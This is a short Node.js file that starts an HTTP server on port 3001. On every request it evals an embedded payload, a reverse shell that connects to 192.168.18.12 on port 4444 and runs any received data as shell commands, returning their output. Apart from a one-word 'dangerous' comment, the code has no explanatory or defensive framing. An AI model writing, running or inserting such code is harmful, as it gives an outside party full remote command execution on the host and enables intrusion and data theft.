const { exec } = require('child_process');
const http = require('http');

const payload = `
const net = require('net');
const { exec } = require('child_process');
const client = new net.Socket();
client.connect(4444, '192.168.18.12', () => {
    client.write('Connected\\n');
});
client.on('data', (data) => {
    exec(data.toString(), (err, stdout) => {
        client.write(stdout || err?.message || 'error');
    });
});
`;

http.createServer((req, res) => {
    eval(payload); // dangerous
    res.end('ok');
}).listen(3001);